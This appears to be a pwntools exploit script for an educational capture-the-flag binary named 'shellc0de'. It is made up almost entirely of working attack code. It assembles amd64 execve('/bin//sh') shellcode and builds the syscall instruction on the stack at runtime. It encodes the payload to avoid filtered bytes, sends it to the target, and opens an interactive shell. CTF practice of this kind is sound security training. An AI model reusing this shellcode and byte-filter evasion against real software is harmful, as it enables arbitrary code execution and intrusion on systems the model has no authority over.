from pwn import *

# r = remote("edu-ctf.csie.org", 10150)
r = process("./shellc0de")
# r = gdb.debug('./shellc0de', 'b main')
context.arch = 'amd64'

shellcode = asm('''
xor    rax,rax
push   rax
mov rax,0x68732f2f6e69622f
push   rax
mov    rdi,rsp
xor    rsi,rsi
xor    rdx,rdx
xor    rax,rax
add    al,0x3b
xor rbx, rbx
add bx, 0x040e
add bx, 0x0101
push bx
jmp rsp
''', arch = 'amd64')

r.recv()
r.sendline(encoder.encode(shellcode, avoid=b'\x05\x0f\x00'))
#r.send(shellcode)

r.interactive()
